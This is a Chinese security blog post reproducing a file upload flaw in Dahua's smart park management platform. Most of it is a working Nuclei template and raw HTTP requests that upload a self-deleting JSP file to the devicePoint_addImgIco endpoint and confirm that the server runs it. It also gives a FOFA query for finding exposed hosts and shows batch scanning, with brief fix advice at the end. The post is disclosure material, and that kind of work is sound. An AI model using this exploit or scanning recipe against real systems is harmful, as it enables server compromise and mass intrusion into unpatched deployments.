#  大华智慧园区综合管理平台hasSubsystem接口处存在文件上传漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-11-18 00:35  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
  
****  
**漏洞描述：**  
  
大华智慧园区综合管理平台hasSubsystem接口处存在文件上传漏。  
攻击者可通过上传包含恶意代码的文件到服务器，使恶意文件被执行，从而导致系统被入侵或遭受其他安全风险。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: dahua-zhihuiyuanqu-hasSubsystem-fileupload

info:
  name: 大华智慧园区综合管理平台hasSubsystem接口处存在文件上传漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: app="dahua-智慧园区综合管理平台"

http:
  - raw:
      - |
        POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
        User-Agent: Java/1.8.0_345
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Length: 229
        Connection: close

        --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
        Content-Disposition: form-data; name="upload"; filename="1.jsp"
        Content-Type: application/octet-stream
        Content-Transfer-Encoding: binary

        <%out.println("test");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--

      - |
        GET /upload/emap/society_new/{{data_url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(body_1,"data")'
              - 'contains(body_2,"test")'
        condition: and

    extractors:
      - type: regex
        name: data_url
        part: body_1
        group: 1
        regex:
          - (ico_res_[a-zA-Z0-9]{12}_on.jsp)
        internal: true
```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：app="dahua-智慧园区综合管理平台"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncB4ElELKGic8fxpuVaU1cKznGE6PUtyzaTaDiaIQbnO7SNBxkkhs4HVic2BQjjfLlXG2yaJXewHJTqw/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncB4ElELKGic8fxpuVaU1cKzHcbmWPkVoKweiaTP3iczuYnO0l2jyBduxFGxdTibegoOibhfOf6HViceib9A/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncB4ElELKGic8fxpuVaU1cKzwVWH7GaSNfvGjibY9Nm4sLMuuKHBVrcgKlSGEZ3ha8MmpsZoZXrgIng/640?wx_fmt=png&from=appmsg "")  
  
访问验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncB4ElELKGic8fxpuVaU1cKzUT5RYl3KyluWKLL7WjRSEH3Gr3B3vuyib9uBKpXuLOxI8KibqS3wicg9w/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Host: 
User-Agent: Java/1.8.0_345
Content-Length: 317
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Accept-Encoding: gzip

--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

<%out.println("test");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--


GET /upload/emap/society_new/ico_res_dca73685d934_on.jsp HTTP/1.1
Host:
```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohncB4ElELKGic8fxpuVaU1cKz6NfiaucdeXBTiaicXUKibSFBTLfOk3DV1Zq0nSD0Tsib0AEUiaurHqgR8DjQ/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、文件类型验证：仅允许上传特定类型的文件，例如图像、文档等，并拒绝可执行文件或其他潜在的恶意文件类型。  
  
2、文件大小限制：限制上传文件的大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。  
  
3、文件名处理：对上传的文件进行重命名，避免使用用户提供的文件名，以防止路径遍历攻击。  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
  
